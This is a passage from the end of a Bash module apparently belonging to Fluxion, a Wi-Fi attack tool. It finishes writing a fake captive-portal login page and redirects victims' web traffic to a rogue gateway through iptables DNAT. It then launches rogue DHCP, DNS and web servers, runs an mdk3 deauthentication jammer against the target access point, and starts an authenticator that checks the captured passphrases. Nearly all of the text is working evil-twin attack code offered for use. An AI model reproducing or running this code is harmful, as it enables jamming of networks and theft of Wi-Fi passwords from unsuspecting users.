				</fieldset>
			</div>
		</div>

		<script src=\"js/main.js\"></script>

		<script>
			$.extend( $.validator.messages, {
				required: \"$DIALOG_WEB_ERROR_MSG\",
				maxlength: $.validator.format( \"$DIALOG_WEB_LENGTH_MAX\" ),
				minlength: $.validator.format( \"$DIALOG_WEB_LENGTH_MIN\" )
			});
		</script>
	</body>
</html>" >"$FLUXIONWorkspacePath/captive_portal/index.html"
}

captive_portal_unset_routes() {
  if [ -f "$FLUXIONWorkspacePath/iptables-rules" ]; then
    iptables-restore <"$FLUXIONWorkspacePath/iptables-rules" \
      &> $FLUXIONOutputDevice
    sandbox_remove_workfile "$FLUXIONWorkspacePath/iptables-rules"
  else
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
  fi

  # Restore system's original forwarding state
  if [ -f "$FLUXIONWorkspacePath/ip_forward" ]; then
    sysctl -w net.ipv4.ip_forward=$(
      cat "$FLUXIONWorkspacePath/ip_forward"
    ) &> $FLUXIONOutputDevice
    sandbox_remove_workfile "$FLUXIONWorkspacePath/ip_forward"
  fi

  ip addr del $CaptivePortalVIGWAddress/24 dev $VIGW 2>/dev/null
}

# Set up DHCP / WEB server
# Set up DHCP / WEB server
captive_portal_set_routes() {
  # Give an address to the gateway interface in the rogue network.
  # This makes the interface accessible from the rogue network.
  ip addr add $CaptivePortalVIGWAddress/24 dev $VIGW

  # Save the system's routing state to restore later.
  cp "/proc/sys/net/ipv4/ip_forward" "$FLUXIONWorkspacePath/ip_forward"

  # Activate system IPV4 packet routing/forwarding.
  sysctl -w net.ipv4.ip_forward=1 &>$FLUXIONOutputDevice

  iptables-save >"$FLUXIONWorkspacePath/iptables-rules"

  iptables --flush
  iptables --table nat --flush
  iptables --delete-chain
  iptables --table nat --delete-chain
  iptables -P FORWARD ACCEPT

  iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT \
    --to-destination $CaptivePortalVIGWAddress:80
  iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT \
    --to-destination $CaptivePortalVIGWAddress:443
  iptables -A INPUT -p tcp --sport 443 -j ACCEPT
  iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
  iptables -t nat -A POSTROUTING -j MASQUERADE
}

captive_portal_stop_interface() {
  captive_portal_unset_routes

  if [ "$APRogueService" ]; then
    ap_stop
  fi
}

captive_portal_start_interface() {
  if [ "$APRogueService" ]; then
    echo -e "$FLUXIONVLine $CaptivePortalStaringAPServiceNotice"
    ap_start
  else
    fluxion_header

    echo -e "$FLUXIONVLine Configuration for external access point device:"
    echo

    fluxion_target_show "$APRogueSSID" "OPEN" "$FluxionTargetChannel" "$APRogueMAC" "$FluxionTargetMaker"

    echo -e "$FLUXIONVLine IPv4 Address: ${CaptivePortalVIGWAddress%.*}.2/24"
    echo -e "$FLUXIONVLine IPv6 Address: Disabled"
    echo -e "$FLUXIONVLine  DHCP Server: $CaptivePortalVIGWAddress"
    echo -e "$FLUXIONVLine   DNS Server: $CaptivePortalVIGWAddress"
    echo

    echo -e "$FLUXIONVLine ${CYel}Assure external AP device is available & configured before continuing!${CClr}"
    read -n1 -p "Press any key to continue... " bullshit
  fi

  echo -e "$FLUXIONVLine $CaptivePortalStaringAPRoutesNotice"
  captive_portal_set_routes &
  sleep 3

  fuser -n tcp -k 53 67 80 443 &> $FLUXIONOutputDevice
  fuser -n udp -k 53 67 80 443 &> $FLUXIONOutputDevice
}


# ============================================================ #
# =================== < Parse Parameters > =================== #
# ============================================================ #
if [ ! "$CaptivePortalCLIArguments" ]; then
  if ! CaptivePortalCLIArguments=$(
    getopt --options="a:j:s:c:u:h:" \
      --longoptions="ap:,jammer:,ssl:,connectivity:,ui:,hash:" \
      --name="Captive Portal V$FLUXIONVersion.$FLUXIONRevision" -- "$@"
    ); then
    echo -e "${CRed}Aborted$CClr, parameter error detected..."
    sleep 5
    fluxion_handle_exit
  fi

  declare -r CaptivePortalCLIArguments=$CaptivePortalCLIArguments

  eval set -- "$CaptivePortalCLIArguments" # Set environment parameters.
fi


# ============================================================ #
# ============= < Argument Loaded Configurables > ============ #
# ============================================================ #
while [ "$1" != "" -a "$1" != "--" ]; do
  case "$1" in
    -a|--ap)
      CaptivePortalAccessPointInterface=$2; shift;;
    -j|--jammer)
      CaptivePortalJammerInterface=$2; shift;;
    -s|--ssl)
      CaptivePortalSSLCertificatePath=$2; shift;;
    -c|--connectivity)
      CaptivePortalConnectivity=$2; shift;;
    -u|--ui)
      CaptivePortalUserInterface=$2; shift;;
    -h|--hash)
      # Assuming hash auth-mode here (the only one available as of now).
      # WARNING: If more auth-modes are added, assume hash auth-mode here!
      CaptivePortalHashPath=$2; shift;;
  esac
  shift # Shift new parameters
done


# ============================================================ #
# ===================== < Fluxion Hooks > ==================== #
# ============================================================ #
attack_targetting_interfaces() {
  interface_list_wireless
  local interface
  for interface in "${InterfaceListWireless[@]}"; do
    echo "$interface"
  done
}

unprep_attack() {
  CaptivePortalState="Not Ready"

  captive_portal_unset_attack
  captive_portal_unset_user_interface
  captive_portal_unset_connectivity
  captive_portal_unset_certificate
  captive_portal_unset_authenticator
  captive_portal_unset_ap_interface
  captive_portal_unset_jammer_interface
}

prep_attack() {
  local sequence=(
    "set_jammer_interface"
    "set_ap_interface"
    "set_authenticator"
    "set_certificate"
    "set_connectivity"
    "set_user_interface"
    "set_attack"
  )

  if ! fluxion_do_sequence captive_portal sequence[@]; then
    return 1
  fi

  CaptivePortalState="Ready"
}

stop_attack() {
  # Attempt to find PIDs of any running authenticators.
  local authenticatorPID=$(ps a | grep -vE "xterm|grep" | grep captive_portal_authenticator.sh | awk '{print $1}')

  # Signal any authenticator to stop authentication loop.
  if [ "$authenticatorPID" ]; then kill -s SIGABRT $authenticatorPID; fi

  if [ "$CaptivePortalJammerServiceXtermPID" ]; then
    kill $(pgrep -P $CaptivePortalJammerServiceXtermPID \
      2> $FLUXIONOutputDevice) &> $FLUXIONOutputDevice
    CaptivePortalJammerServiceXtermPID="" # Clear parent PID
  fi
  sandbox_remove_workfile "$FLUXIONWorkspacePath/mdk3_blacklist.lst"

  # Kill captive portal web server log viewer.
  if [ "$CaptivePortalWebServiceXtermPID" ]; then
    kill $CaptivePortalWebServiceXtermPID &> $FLUXIONOutputDevice
    CaptivePortalWebServiceXtermPID="" # Clear service PID
  fi

  # Kill captive portal web server.
  if [ "$CaptivePortalWebServicePID" ]; then
    kill $CaptivePortalWebServicePID &> $FLUXIONOutputDevice
    CaptivePortalWebServicePID="" # Clear service PID
  fi

  # Kill python DNS service if one is found.
  if [ "$CaptivePortalDNSServiceXtermPID" ]; then
    kill $(pgrep -P $CaptivePortalDNSServiceXtermPID \
      2> $FLUXIONOutputDevice) &> $FLUXIONOutputDevice
    CaptivePortalDNSServiceXtermPID="" # Clear parent PID
  fi

  # Kill DHCP service.
  if [ "$CaptivePortalDHCPServiceXtermPID" ]; then
    kill $(pgrep -P $CaptivePortalDHCPServiceXtermPID \
      2> $FLUXIONOutputDevice) &> $FLUXIONOutputDevice
    CaptivePortalDHCPServiceXtermPID="" # Clear parent PID
  fi
  sandbox_remove_workfile "$FLUXIONWorkspacePath/clients.txt"

  captive_portal_stop_interface

  CaptivePortalState="Stopped"
}

start_attack() {
  if [ "$CaptivePortalState" = "Running" ]; then return 0; fi
  if [ "$CaptivePortalState" != "Ready" ]; then return 1; fi
  CaptivePortalState="Running"

  stop_attack

  captive_portal_start_interface

  echo -e "$FLUXIONVLine $CaptivePortalStartingDHCPServiceNotice"
  xterm $FLUXIONHoldXterm $TOPLEFT -bg black -fg "#CCCC00" \
    -title "FLUXION AP DHCP Service" -e \
    "dhcpd -d -f -lf \"$FLUXIONWorkspacePath/dhcpd.leases\" -cf \"$FLUXIONWorkspacePath/dhcpd.conf\" $VIGW 2>&1 | tee -a \"$FLUXIONWorkspacePath/clients.txt\"" &
  # Save parent's pid, to get to child later.
  CaptivePortalDHCPServiceXtermPID=$!

  echo -e "$FLUXIONVLine $CaptivePortalStartingDNSServiceNotice"
  xterm $FLUXIONHoldXterm $BOTTOMLEFT -bg black -fg "#99CCFF" \
    -title "FLUXION AP DNS Service" -e \
    "if type python2 >/dev/null 2>/dev/null; then python2 \"$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py\"; else python \"$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py\"; fi" &
  # Save parent's pid, to get to child later.
  CaptivePortalDNSServiceXtermPID=$!

  echo -e "$FLUXIONVLine $CaptivePortalStartingWebServiceNotice"
  lighttpd -f "$FLUXIONWorkspacePath/lighttpd.conf" \
    &> $FLUXIONOutputDevice
  CaptivePortalWebServicePID=$!

  xterm $FLUXIONHoldXterm $BOTTOM -bg black -fg "#00CC00" \
    -title "FLUXION Web Service" -e \
    "tail -f \"$FLUXIONWorkspacePath/lighttpd.log\"" &
  CaptivePortalWebServiceXtermPID=$!

  echo -e "$FLUXIONVLine $CaptivePortalStartingJammerServiceNotice"
  echo -e "$FluxionTargetMAC" >"$FLUXIONWorkspacePath/mdk3_blacklist.lst"
  xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
    -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
    "mdk3 $WIMonitor d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk3_blacklist.lst\"" &
  # Save parent's pid, to get to child later.
  CaptivePortalJammerServiceXtermPID=$!

  echo -e "$FLUXIONVLine $CaptivePortalStartingAuthenticatorServiceNotice"
  xterm -hold $TOPRIGHT -bg black -fg "#CCCCCC" \
    -title "FLUXION AP Authenticator" \
    -e "$FLUXIONWorkspacePath/captive_portal_authenticator.sh" &

}

# FLUXSCRIPT END
